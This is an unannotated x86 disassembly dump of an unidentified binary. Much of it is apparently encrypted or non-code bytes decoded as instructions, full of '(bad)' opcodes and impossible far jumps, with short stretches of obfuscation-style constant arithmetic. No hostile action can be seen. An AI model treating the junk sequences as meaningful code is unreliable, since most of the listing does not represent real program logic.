  412043:	shr    DWORD PTR [edx],cl
  412045:	pop    eax
  412046:	mov    al,0xdb
  412048:	retf   0xd65b
  41204b:	out    dx,al
  41204c:	in     eax,dx
  41204d:	jp     0x41201e
  41204f:	inc    ecx
  412050:	call   0x94ee4720
  412055:	xchg   BYTE PTR [esp+ebx*4-0x3c],al
  412059:	inc    esp
  41205a:	leave  
  41205b:	fmul   QWORD PTR [esi+0x503838b5]
  412061:	sar    BYTE PTR [ecx-0x31],cl
  412064:	inc    esp
  412065:	xchg   BYTE PTR [ebx],bl
  412067:	sub    eax,0x41c03595
  41206c:	pop    edi
  41206d:	not    BYTE PTR [ebx+0x69]
  412070:	sti    
  412071:	xor    al,0x2d
  412073:	dec    ebp
  412074:	pusha  
  412075:	cmp    al,0xaf
  412077:	cli    
  412078:	add    eax,0xe1a24ec5
  41207d:	push   eax
  41207e:	push   ss
  41207f:	nop
  412080:	fxch   st(3)
  412082:	pop    edi
  412083:	xchg   esi,eax
  412084:	mov    al,BYTE PTR [ebp+0x56]
  412087:	mov    bh,0x79
  412089:	push   cs
  41208a:	cs mov esp,0x3b194255
  412090:	or     edi,DWORD PTR [esi]
  412092:	cmc    
  412093:	push   0x8b2d3fc4
  412098:	ds (bad) 
  41209b:	push   esp
  41209c:	adc    ch,BYTE PTR [ecx-0x12]
  41209f:	retf   
  4120a0:	xchg   edx,eax
  4120a1:	inc    ebp
  4120a2:	retf   0x27f9
  4120a5:	(bad)  
  4120a6:	pop    esp
  4120a7:	sbb    ebx,DWORD PTR [edx]
  4120a9:	add    eax,0xdb0ad669
  4120ae:	mov    cs,WORD PTR ds:0xe2b0aa00
  4120b4:	pop    ds
  4120b5:	icebp  
  4120b6:	mov    ebx,0x6d005b0f
  4120bb:	push   ecx
  4120bc:	jp     0x41204a
  4120be:	fistp  DWORD PTR ds:0x24fb03b4
  4120c4:	daa    
  4120c5:	cmc    
  4120c6:	cmp    DWORD PTR [eax],edi
  4120c8:	or     DWORD PTR [edx],edx
  4120ca:	test   BYTE PTR [ebp+0x415e8c29],0xb0
  4120d1:	std    
  4120d2:	retf   0xcb24
  4120d5:	fisub  WORD PTR [ecx-0x73851494]
  4120db:	mov    ch,0x2a
  4120dd:	push   ss
  4120de:	push   edx
  4120df:	mov    cl,0x9a
  4120e1:	stc    
  4120e2:	jns    0x4120d8
  4120e4:	mov    bh,0x14
  4120e6:	mov    bh,0xf7
  4120e8:	xor    esp,DWORD PTR [eax]
  4120ea:	mov    DWORD PTR [edi-0x57],ebp
  4120ed:	cmp    ah,0x50
  4120f0:	adc    BYTE PTR [edi+0x5b998bab],ah
  4120f6:	std    
  4120f7:	mov    bh,0xff
  4120f9:	and    ebp,DWORD PTR [ebx]
  4120fb:	cmp    BYTE PTR [ecx],dh
  4120fd:	push   cs
  4120fe:	xchg   esp,eax
  4120ff:	daa    
  412100:	ins    BYTE PTR es:[edi],dx
  412101:	mov    ?,WORD PTR [ecx-0x3e]
  412104:	shl    DWORD PTR [eax],1
  412106:	or     eax,0xcae1a532
  41210b:	pop    esp
  41210c:	popf   
  41210d:	fsub   QWORD PTR [ebx+0x36c98e69]
  412113:	mov    ss,WORD PTR [edx+0x40]
  412116:	lahf   
  412117:	pop    eax
  412118:	(bad)  
  412119:	adc    edi,ebx
  41211b:	cmc    
  41211c:	or     eax,0xc9d1a646
  412121:	mov    al,ds:0x3e7981f1
  412126:	cmp    ecx,ebx
  412128:	cwde   
  412129:	std    
  41212a:	test   BYTE PTR [ecx],dl
  41212c:	in     eax,dx
  41212d:	xchg   bh,ah
  41212f:	popaw  
  412131:	dec    ebx
  412132:	aaa    
  412133:	mov    gs,WORD PTR [edx+0x5f]
  412136:	mov    eax,ds:0xe1d0508
  41213b:	jp     0x412186
  41213d:	mov    bl,bl
  41213f:	call   0x25e05eb2
  412144:	push   ss
  412145:	cmp    al,0xed
  412147:	bound  esi,QWORD PTR [eax-0x1a]
  41214a:	dec    edx
  41214b:	and    dl,al
  41214d:	cmp    ecx,DWORD PTR [eax-0x7b820d41]
  412153:	fcom   QWORD PTR [edx+0x5d490800]
  412159:	js     0x412190
  41215b:	sbb    al,BYTE PTR [edx+0x76]
  41215e:	out    0x44,al
  412160:	dec    edx
  412161:	pop    es
  412162:	lea    eax,[edx]
  412164:	xor    ebx,DWORD PTR [esi-0x33]
  412167:	dec    eax
  412168:	jno    0x41218c
  41216a:	arpl   WORD PTR [esi-0x68],di
  41216d:	cli    
  41216e:	cmp    ebx,esp
  412170:	pop    ecx
  412171:	jbe    0x41218a
  412173:	xchg   ecx,eax
  412174:	push   eax
  412175:	out    0x40,al
  412177:	sahf   
  412178:	sti    
  412179:	sbb    eax,edi
  41217b:	jae    0x4121ad
  41217d:	aaa    
  41217e:	jl     0x41211d
  412180:	outs   dx,BYTE PTR ds:[esi]
  412181:	xchg   esi,eax
  412182:	in     eax,dx
  412183:	(bad)  
  412184:	jmp    0xb2293e68
  412189:	lods   eax,DWORD PTR ds:[esi]
  41218a:	sbb    dl,ch
  41218c:	and    DWORD PTR [ebp-0x6015dd3b],ebx
  412192:	adc    eax,DWORD PTR [edx+0x706a7667]
  412198:	mov    ah,0x2d
  41219a:	push   edx
  41219b:	(bad)  [ecx+eiz*1-0x18]
  41219f:	mov    dl,0xa3
  4121a1:	mov    al,ds:0xcfc9edcb
  4121a6:	xchg   edi,eax
  4121a7:	(bad)  
  4121a8:	fwait
  4121a9:	fwait
  4121aa:	push   ebp
  4121ab:	mov    ah,0xb9
  4121ad:	dec    eax
  4121ae:	inc    ebx
  4121af:	cld    
  4121b0:	jmp    0x4121c7
  4121b2:	and    ebp,DWORD PTR [ebp-0x22ab5f79]
  4121b8:	and    ch,cl
  4121ba:	lods   eax,DWORD PTR ds:[esi]
  4121bb:	fnstenv [ebx+0x6e805cfa]
  4121c1:	inc    ecx
  4121c2:	mov    ebx,0x3e233c79
  4121c7:	adc    bl,bh
  4121c9:	ret    0x2b2d
  4121cc:	cmp    al,0x96
  4121ce:	push   edx
  4121cf:	mov    dh,0x98
  4121d1:	jle    0x41218d
  4121d3:	arpl   WORD PTR [esi],bx
  4121d5:	xchg   edi,eax
  4121d6:	call   0xc6fb:0x922a24f0
  4121dd:	mov    ebx,0x6f79a29
  4121e2:	xor    al,0xde
  4121e4:	mov    esi,0x44d4c958
  4121e9:	sbb    ebp,DWORD PTR [ebx+0x1d84290]
  4121ef:	xor    bh,ch
  4121f1:	cmp    edx,esp
  4121f3:	jo     0x412179
  4121f5:	push   ecx
  4121f6:	jmp    0x412273
  4121f8:	sub    ecx,DWORD PTR [ebx-0x1288b518]
  4121fe:	pusha  
  4121ff:	mov    BYTE PTR [edx-0x1e04b348],ch
  412205:	outs   dx,DWORD PTR fs:[esi]
  412207:	sbb    al,0xac
  412209:	loope  0x41219e
  41220b:	into   
  41220c:	aad    0x68
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225ac
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	inc    ebx
  4122a2:	pop    ebp
  4122a3:	iret   
  4122a4:	jo     0x4122a4
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	push   ss
  4122ae:	dec    edx
  4122af:	repz xor BYTE PTR [edi+edx*1-0x30539c47],bl
  4122b7:	xor    esp,DWORD PTR [edx+0xe8848b]
  4122bd:	(bad)  
  4122be:	fld    TBYTE PTR cs:[ecx+ecx*4]
  4122c2:	dec    esp
  4122c3:	inc    edi
  4122c4:	cwde   
  4122c5:	shr    BYTE PTR [ecx-0x1fb9c892],cl
  4122cb:	je     0x4122e2
  4122cd:	jno    0x41228f
  4122cf:	je     0x4122bc
  4122d1:	mov    bh,0xec
  4122d3:	cld    
  4122d4:	dec    esp
  4122d5:	push   esp
  4122d6:	dec    ebp
  4122d7:	call   0xc387:0xbbdc39d7
  4122de:	cmc    
  4122df:	mov    ss,WORD PTR ds:0xa48b15d
  4122e5:	and    BYTE PTR [ebx-0x67c6f7be],bl
  4122eb:	push   esp
  4122ec:	and    eax,0xde9d2646
  4122f1:	inc    esp
  4122f2:	dec    edi
  4122f3:	push   edx
  4122f4:	jl     0x412344
  4122f6:	in     eax,dx
  4122f7:	jbe    0x4122ae
  4122f9:	xor    dh,BYTE PTR [ecx]
  4122fb:	xor    bh,BYTE PTR [esi+0x34]
  4122fe:	sbb    bl,ah
  412300:	jmp    0x89d9:0x3aad603
  412307:	cmp    eax,0xb4ba065
  41230c:	inc    edx
  41230d:	push   ss
  41230e:	mov    eax,ds:0x96aede5b
  412313:	and    al,0x6f
  412315:	into   
  412316:	and    BYTE PTR [ecx],ah
  412318:	gs inc esp
  41231a:	pop    ss
  41231b:	dec    eax
  41231c:	into   
  41231d:	mov    bh,0x4
  41231f:	stos   DWORD PTR es:[edi],eax
  412320:	inc    ebx
  412321:	push   ebx
  412322:	call   0x7aab:0x3e9fb564
  412329:	in     al,0x14
  41232b:	out    dx,eax
  41232c:	dec    ebp
  41232d:	xlat   BYTE PTR ds:[ebx]
  41232e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412330:	enter  0x18a9,0x5d
  412334:	fst    DWORD PTR [esi+0x566240ee]
  41233a:	push   ebp
  41233b:	lods   eax,DWORD PTR ds:[esi]
  41233c:	pop    ecx
  41233d:	shl    DWORD PTR [edi+ecx*1+0x6],1
  412341:	fucomi st,st(7)
  412343:	sub    al,BYTE PTR ds:0x642fc042
  412349:	fmul   DWORD PTR [eax-0x78]
  41234c:	in     al,0xc5
  41234e:	adc    bl,BYTE PTR [edi]
  412350:	sub    ebp,ebp
  412352:	(bad)  
  412353:	in     eax,dx
  412354:	xchg   esi,eax
  412355:	les    ecx,FWORD PTR [eax]
  412357:	inc    ecx
  412358:	sbb    BYTE PTR [edi-0x189ef09b],ch
  41235e:	out    dx,al
  41235f:	mov    ah,0x32
  412361:	pusha  
  412362:	jmp    0x41235f
  412364:	fld    DWORD PTR [esi+0x188d1934]
  41236a:	aas    
  41236b:	pop    edi
  41236c:	sbb    ch,BYTE PTR [edi+eiz*4-0x41a83340]
  412373:	push   0x24be233b
  412378:	(bad)  
  412379:	push   ecx
  41237a:	cmp    ebp,DWORD PTR [ebp-0x23]
  41237d:	or     BYTE PTR [ebp-0x52405886],ah
  412383:	inc    eax
  412384:	(bad)  
  412386:	(bad)  
  412387:	or     al,0x46
  412389:	idiv   al
  41238b:	jl     0x412352
  41238d:	and    eax,0x6843e210
  412392:	out    0x5,eax
  412394:	data16 jg 0x4123bf
  412397:	rol    BYTE PTR [edx+0x69f6a971],cl
  41239d:	fidivr DWORD PTR [ebx+0x25b33644]
  4123a3:	inc    ebp
  4123a4:	or     al,0xa3
  4123a6:	hlt    
  4123a7:	jns    0x41240a
  4123a9:	add    cl,BYTE PTR [ebx]
  4123ab:	and    al,0x69
  4123ad:	or     eax,0xad60e61f
  4123b2:	jns    0x4123bb
  4123b4:	pop    edx
  4123b5:	inc    eax
  4123b6:	cmp    ecx,DWORD PTR [eax+0x5bc7fbc6]
  4123bc:	push   es
  4123bd:	call   0xa845:0xee4f1d6f
  4123c4:	add    ebx,edx
  4123c6:	jmp    0x4123d9
  4123c8:	adc    ch,BYTE PTR [ecx-0x2]
  4123cb:	adc    BYTE PTR [ecx+eiz*4-0x417a8660],ch
  4123d2:	sub    DWORD PTR [ebx+0x3a],edi
  4123d5:	(bad)  
  4123d6:	xchg   esi,eax
  4123d7:	xchg   edi,eax
  4123d8:	call   0xde86:0x4d562c4e
  4123df:	ficomp DWORD PTR [esi-0x6c]
  4123e2:	adc    BYTE PTR [edx],ah
  4123e4:	xchg   edi,eax
  4123e5:	sbb    dh,BYTE PTR [ebx]
  4123e7:	cli    
  4123e8:	fs (bad) 
  4123ea:	push   edi
  4123eb:	mov    esi,0xd24165ea
  4123f0:	jmp    0xf27:0x2544a776
  4123f7:	xor    edx,DWORD PTR [ecx+0x3aadd74c]
  4123fd:	mov    eax,ds:0x7cf328e0
  412402:	jae    0x4123ae
  412404:	or     eax,0x5c1950a3
  412409:	lahf   
  41240a:	stos   BYTE PTR es:[edi],al
  41240b:	pop    esi
  41240c:	jns    0x4123c5
  41240e:	cmp    BYTE PTR [esp+ecx*1-0x17],cl
  412412:	adc    bh,bh
  412414:	dec    esp
  412415:	push   ds
  412416:	cmp    edi,DWORD PTR [edi-0x76f5f947]
  41241c:	mov    dh,0xf5
  41241e:	pop    ecx
  41241f:	add    BYTE PTR [ebp+0x69958317],cl
  412425:	imul   edx,esi,0x5e
  412428:	addr16 pusha 
  41242a:	lock pop edi
  41242c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41242d:	cmp    dh,0x7e
  412430:	inc    edx
  412431:	xor    DWORD PTR ds:0xb4d86f36,esi
  412437:	outs   dx,DWORD PTR ds:[esi]
  412438:	cmp    eax,0xc8417c27
  41243d:	lock ins DWORD PTR es:[edi],dx
  41243f:	aas    
  412440:	sbb    esp,DWORD PTR [edi+0x7bd9f8c8]
  412446:	ficomp WORD PTR [esi+eax*1]
  412449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41244a:	iret   
  41244b:	push   edi
  41244c:	clc    
  41244d:	dec    edx
  41244e:	lds    ecx,FWORD PTR [esi-0x4f0bf334]
  412454:	xor    ch,cl
  412456:	add    eax,0x44431b23
  41245b:	cmp    BYTE PTR [edx+ecx*1-0x4c2afa4d],dl
  412462:	fmul   DWORD PTR [ecx-0x6d]
  412466:	cli    
  412467:	pop    edx
  412468:	jae    0x4124bd
  41246a:	jecxz  0x412469
  41246c:	(bad)  
  41246d:	pop    ebp
  41246e:	xchg   ebx,eax
  41246f:	repnz into 
  412471:	ror    DWORD PTR [ebp-0x7],0x1f
  412475:	and    BYTE PTR [edi],0x10
  412478:	scas   al,BYTE PTR es:[edi]
  412479:	mov    edi,0x92e8ed5f
  41247e:	dec    edi
  41247f:	fcmovu st,st(3)
  412481:	pop    ss
  412482:	dec    edi
  412483:	(bad)  
  412484:	adc    dh,BYTE PTR [eax]
  412486:	outs   dx,DWORD PTR ds:[esi]
  412487:	push   eax
  412488:	sbb    eax,0x15b33924
  41248d:	pop    ss
  41248e:	lahf   
  41248f:	push   ds
  412490:	pop    ss
  412491:	loopne 0x4124a1
  412493:	sbb    BYTE PTR ds:0x135203ae,dh
  412499:	aaa    
  41249a:	es xor ecx,ebp
  41249d:	aam    0x85
  41249f:	aad    0x4
  4124a1:	xchg   BYTE PTR [ebp+0x246ea13e],ch
  4124a7:	push   eax
  4124a8:	dec    edx
  4124a9:	mov    edi,0x840a1fa4
  4124ae:	sub    ecx,DWORD PTR [edx]
  4124b0:	into   
  4124b1:	mov    ch,0xc3
  4124b3:	test   eax,0x6e1d95d7
  4124b8:	cmp    al,0x7c
  4124ba:	adc    cl,bl
  4124bc:	mov    ebp,es
  4124be:	std    
  4124bf:	call   0x7048:0xb487b648
  4124c6:	sbb    DWORD PTR [ecx+0x7fd5cfae],0xffffffa3
  4124cd:	add    DWORD PTR [ebp+0x55613d05],eax
  4124d3:	or     ebx,ecx
  4124d5:	mov    dh,0x7e
  4124d7:	arpl   WORD PTR [esp+ebp*2-0x54914d9e],di
  4124de:	cmc    
  4124df:	add    dh,BYTE PTR [ecx-0x24]
  4124e2:	es xchg ebp,eax
  4124e4:	pop    esi
  4124e5:	mov    cl,0x17
  4124e7:	add    DWORD PTR [ebx-0x1ef15dac],ebx
  4124ed:	(bad)  
  4124ee:	xchg   ebx,eax
  4124ef:	push   esp
  4124f0:	int    0x56
  4124f2:	leave  
  4124f3:	mov    al,0xc9
  4124f5:	push   edx
  4124f6:	pusha  
  4124f7:	add    BYTE PTR [edx+0x138c19fd],ah
  4124fd:	aaa    
  4124fe:	inc    edi
  412500:	aas    
  412501:	fsubr  st,st(6)
  412503:	xor    dh,BYTE PTR [edi-0xeec2ffd]
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x422031
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4124db
  412538:	cmp    al,BYTE PTR [ebx+0x185c577c]
  41253e:	sbb    BYTE PTR [ecx+0x14],dh
  412541:	sbb    BYTE PTR [eax],bl
  412543:	xchg   edi,eax
  412544:	aad    0xc7
  412546:	fidiv  WORD PTR [esi+edi*4]
  412549:	imul   eax,DWORD PTR [ecx-0x16ec992e],0xc93e6883
  412553:	adc    ebx,esi
  412555:	xchg   ebx,eax
  412556:	jns    0x412556
  412558:	les    edx,FWORD PTR [edx+0x4a65ec60]
  41255e:	loop   0x4124fd
  412560:	call   0x7982:0x4f54c103
  412567:	mov    edx,0x67f4c0dc
  41256c:	les    eax,FWORD PTR [eax]
  41256e:	jmp    0x412532
  412570:	inc    ebp
  412571:	mov    ebx,0x73cd6846
  412576:	pop    eax
  412577:	inc    edx
  412578:	fbld   TBYTE PTR [edi]
  41257a:	xchg   ebp,eax
  41257b:	fs pop ecx
  41257d:	mov    dh,0xf6
  41257f:	out    dx,eax
  412580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412581:	xchg   esi,eax
  412582:	mov    bh,BYTE PTR [ecx+eiz*8+0x1fa802e9]
  412589:	mov    ecx,0xf8aca70a
  41258e:	mov    edx,DWORD PTR ds:0x901c44e7
  412594:	mov    ch,0xe7
  412596:	lods   al,BYTE PTR ds:[esi]
  412597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412598:	in     eax,dx
  412599:	jge    0x412602
  41259b:	scas   eax,DWORD PTR es:[edi]
  41259c:	mov    dl,0xf2
  41259e:	stos   BYTE PTR es:[edi],al
  41259f:	xchg   BYTE PTR [ebx-0x2],al
  4125a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125a3:	rol    BYTE PTR es:[esi-0x3b03e22c],1
  4125aa:	in     al,0xc3
  4125ac:	stos   DWORD PTR es:[edi],eax
  4125ad:	mov    ah,BYTE PTR gs:[eax-0x3a]
  4125b1:	adc    dh,BYTE PTR [ebx-0x32caa47b]
  4125b7:	outs   dx,BYTE PTR ds:[esi]
  4125b8:	(bad)  
  4125b9:	scas   eax,DWORD PTR es:[edi]
  4125ba:	xchg   esp,eax
  4125bb:	xchg   ecx,eax
  4125bc:	cmp    ecx,ebx
  4125be:	pop    ebp
  4125bf:	nop
  4125c0:	jmp    0x4125df
  4125c2:	jmp    0x694b:0x838adae3
  4125c9:	inc    ebp
  4125ca:	fdivrp st(4),st
  4125cc:	mov    ebp,0x29ae8b0d
  4125d1:	jecxz  0x4125f7
  4125d3:	sbb    eax,0xff13167e
  4125d8:	pop    ebx
  4125d9:	sbb    cl,BYTE PTR [ecx+0x49f9be44]
  4125df:	xor    ecx,esi
  4125e1:	xlat   BYTE PTR ds:[ebx]
  4125e2:	lock mov eax,0x3856d544
  4125e8:	in     al,0xd0
  4125ea:	or     bh,dl
  4125ec:	or     BYTE PTR [esi+0x79],bl
  4125ef:	push   eax
  4125f0:	and    BYTE PTR [edx-0x18],al
  4125f3:	lock retf 
  4125f5:	sub    esp,ecx
  4125f7:	cdq    
  4125f8:	push   edi
  4125f9:	mov    ch,0x79
  4125fb:	ds je  0x4125b2
  4125fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125ff:	(bad)  
  412601:	ror    BYTE PTR [eax-0x61],cl
  412604:	in     eax,dx
  412605:	(bad)  
  412606:	and    DWORD PTR [ebp+0x53],edx
  412609:	mov    eax,ds:0xa446d626
  41260e:	pop    ss
  41260f:	xor    DWORD PTR [edi],eax
  412611:	cmp    dh,BYTE PTR [ebp*8+0x5ad82419]
  412618:	add    dl,BYTE PTR [ecx-0x4462a546]
  41261e:	mov    dl,0x8a
  412620:	jp     0x412697
  412622:	dec    edi
  412623:	pop    edx
  412624:	lahf   
  412625:	mov    ebp,0x249cc2ec
  41262a:	jne    0x4126a4
  41262c:	or     al,0x3d
  41262e:	jmp    0x41ce:0x9519aa66
  412635:	mov    cl,bh
  412637:	dec    eax
  412638:	jnp    0x412673
  41263a:	mov    eax,ebx
  41263c:	fbld   TBYTE PTR [ebp+0x4b]
  41263f:	or     eax,0x1adb4218
  412644:	xchg   ebx,eax
  412645:	cwde   
  412646:	mov    eax,0x39ef6389
  41264b:	inc    edx
  41264c:	adc    al,0x96
  41264e:	pop    edx
  41264f:	(bad)  
  412650:	mov    bl,0x91
  412652:	adc    ebp,ebx
  412654:	jmp    0x4125f0
  412656:	aam    0x62
  412658:	push   cs
  412659:	in     al,dx
  41265a:	pop    esp
  41265b:	scas   al,BYTE PTR es:[edi]
  41265c:	pop    edi
  41265d:	pop    esp
  41265e:	inc    edi
  41265f:	sbb    BYTE PTR [edi-0x71cb1e4e],cl
  412665:	dec    edi
  412666:	inc    ecx
  412667:	or     eax,0x99966bf
  41266c:	sbb    eax,0xcda9976d
  412671:	inc    eax
  412672:	aas    
  412673:	inc    eax
  412674:	daa    
  412675:	rol    edi,0xf8
  412678:	(bad)  
  412679:	fild   QWORD PTR [edx+ebx*2+0x4be3b187]
  412680:	cmp    ebx,DWORD PTR [edx+0x2c]
  412683:	call   0x8345a40e
  412688:	jge    0x412640
  41268a:	fld    DWORD PTR [eax+0xf]
  41268d:	stos   DWORD PTR es:[edi],eax
  41268e:	cmp    cl,bl
  412690:	scas   eax,DWORD PTR es:[edi]
  412691:	call   0x9688d1d2
  412696:	xchg   esp,eax
  412697:	jg     0x412716
  412699:	ror    DWORD PTR [eax-0x21ab97c],0xd5
  4126a0:	cli    
  4126a1:	or     BYTE PTR [ebx+0x52],ch
  4126a4:	sub    esp,DWORD PTR [edx+eax*4-0x4f936221]
  4126ab:	adc    DWORD PTR [esi],ebx
  4126ad:	leave  
  4126ae:	and    esi,eax
  4126b0:	jle    0x41271a
  4126b2:	icebp  
  4126b3:	pop    edi
  4126b4:	call   FWORD PTR [edx]
  4126b6:	out    0xa0,eax
  4126b8:	mov    ah,BYTE PTR [eax-0x7d]
  4126bb:	xchg   BYTE PTR [eax],cl
  4126bd:	out    0xb0,al
  4126bf:	sub    eax,0x8b4fef6
  4126c4:	dec    ebp
  4126c5:	enter  0x586d,0xc3
  4126c9:	inc    ebx
  4126ca:	mov    edx,0xa53dbf64
  4126cf:	mov    DWORD PTR [ebx+0x5f],esp
  4126d2:	pushf  
  4126d3:	lea    esp,[eax]
  4126d5:	jae    0x412704
  4126d7:	xchg   edi,eax
  4126d8:	add    esp,DWORD PTR [esi+0x6deb8569]
  4126de:	lds    ebx,FWORD PTR [edx-0x5f]
  4126e1:	in     eax,dx
  4126e2:	arpl   WORD PTR [edi+0x3e],di
  4126e5:	ja     0x41268c
  4126e7:	in     al,dx
  4126e8:	cmc    
  4126e9:	add    BYTE PTR [ebx+0x2b9960bf],0x35
  4126f0:	(bad)  
  4126f1:	fcmovu st,st(2)
  4126f3:	pushf  
  4126f4:	jmp    0x412705
  4126f6:	rcr    BYTE PTR [edi-0x9b92386],cl
  4126fc:	or     edx,DWORD PTR es:[ecx-0x40]
  412700:	in     eax,dx
  412701:	je     0x412709
  412703:	push   ss
  412704:	sub    DWORD PTR [ebp-0xb61cf8c],edx
  41270a:	test   eax,0x1f599f7d
  41270f:	sub    BYTE PTR [ebx],ah
  412711:	mov    BYTE PTR [edx+edx*1+0x4d25a59e],ah
  412718:	loopne 0x41277d
  41271a:	test   BYTE PTR [eax+esi*4-0x717fd708],ah
  412721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412722:	mov    dl,0x39
  412724:	(bad)  
  412725:	fimul  DWORD PTR [ebp-0x33d87b31]
  41272b:	or     eax,0xbbfa244
  412730:	pop    ss
  412731:	in     al,dx
  412732:	ret    
  412733:	xchg   ebx,eax
  412734:	jne    0x412762
  412736:	pop    esi
  412737:	jns    0x412786
  412739:	inc    esp
  41273a:	and    bh,ch
  41273c:	inc    esp
  41273d:	mov    eax,ds:0x9d9e728a
  412742:	loop   0x412748
  412744:	jo     0x4126c9
  412746:	push   edi
  412747:	ins    DWORD PTR es:[edi],dx
  412748:	xor    al,0x5
  41274a:	jg     0x412754
  41274c:	not    BYTE PTR [edi]
  41274e:	sub    al,0xb0
  412750:	out    dx,eax
  412751:	xor    eax,0x54e2b000
  412756:	aam    0x1
  412758:	push   edx
  412759:	add    eax,0xb5fcc776
  41275e:	leave  
  41275f:	(bad)  
  412760:	jns    0x412748
  412762:	sub    DWORD PTR [edx-0x2b],0xffffff92
  412766:	sbb    ebp,DWORD PTR [ecx]
  412768:	fisub  DWORD PTR ds:0x54410f45
  41276e:	retf   
  41276f:	jge    0x412794
  412771:	jne    0x4127d4
  412773:	mov    al,0x98
  412775:	dec    eax
  412776:	jle    0x41277f
  412778:	(bad)
  41277b:	inc    ebx
  41277c:	mov    bh,0xf5
  41277e:	aad    0x47
  412780:	push   es
  412781:	dec    esp
  412782:	sbb    ecx,edx
  412784:	fist   WORD PTR [ecx]
  412786:	mov    ds:0xc18ca198,al
  41278b:	pop    ebp
  41278c:	xchg   DWORD PTR [ebx+0x12],eax
  41278f:	mov    bl,0x0
  412791:	mov    DWORD PTR [esi-0x4e5ee647],ebp
  412797:	or     DWORD PTR [ebp+esi*4-0x743de4c0],ecx
  41279e:	adc    eax,0x4225ac
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225ac
  4127d5:	mov    ds:0x4225b4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
